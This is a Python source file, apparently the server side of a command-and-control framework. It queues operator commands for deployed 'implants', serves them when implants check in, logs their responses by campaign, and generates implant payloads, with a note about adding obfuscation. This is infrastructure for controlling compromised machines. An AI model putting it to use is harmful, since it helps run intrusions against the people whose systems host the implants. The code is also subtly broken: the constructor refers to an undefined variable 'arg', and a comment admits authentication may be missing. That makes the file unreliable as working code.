from Data.Database import Database
from Implant.ImplantGeneratorDecorators import ImplantGenerator
class ImplantSingleton:
    class __OnlyOne:
        # -- The Implant class is sole class responible for controlling data to and from implants.
        # --    it manages  these interaction across all types of implants and communication protocols.

        def AddCommand(self, User, cid, UniqueImplantKey,Command):
            # -- Add record to issue command table with username - time - command - UID
            # -- Implement the logging calls to ensure entries got to DB. and get recorded on pick up
            # Writes command to the database.
            #   checks for authorisation to write commands.
            #   The AddCommand should only be called form 'ImplantManagement'
            db.Register_ImplantCommand(User, UniqueImplantKey, Command, cid=cid)

        def IssueCommand(self,UIK=0):
            if UIK != 0:
                # -- Issue command based on unique implant identifiers (UIK)
                # -- UIK is embedded into the implant via Jinja on delivery.
                ImplantObj=db.Get_GeneratedImplantDataFromUIK(UIK)
                for implant in ImplantObj:
                    ImpLogs = db.Get_RegisteredImplantCommandsFromUIK(implant['unique_implant_id'])
                    tmpImpLogs = []
                    for x in ImpLogs:
                        if x.read_by_implant == 0:
                            tmpImpLogs.append(x)
                    if len(tmpImpLogs) != 0:
                        Entry = min(tmpImpLogs, key=lambda x: x.time)
                        if db.Register_ImplantCommandPickup(Entry):
                            return Entry.log_entry

            # -- Create a suitable null response.
            # --    This may be a random value, depending on how the implant handles it.
                return "=="
            else:
                return "=="
        def CommandResponse(self,result):
            aa = result.split("::", 1)
            generated_implant_data = db.Get_GeneratedImplantDataFromUIK(aa[0])
            print(generated_implant_data)
            db.Register_ImplantResponse(generated_implant_data[0]['cid'],aa[0],aa[1])
            # -- Legacy Format Below: To remove -- #
            # self.CommandOutput.append(result)
            return 0

        def Get_CommandResult(self,cid):
            # -- This trust any calls have already been authenticated/
            # --    May need to move authentication to this level.
            return db.Get_CampaignImplantResponses(cid)

        def GeneratePayload(self, NewSplicedImplantData):
            # TODO: Add a payload obfuscation level - this will be dealt within then render implant function.
            aaa = ImplantGenerator()
            return aaa.render_implant_(NewSplicedImplantData)

    instance = None
    def __init__(self):
        if not ImplantSingleton.instance:
            ImplantSingleton.instance = ImplantSingleton.__OnlyOne()
        else:
            ImplantSingleton.instance.val = arg

db = Database()
x = ImplantSingleton()

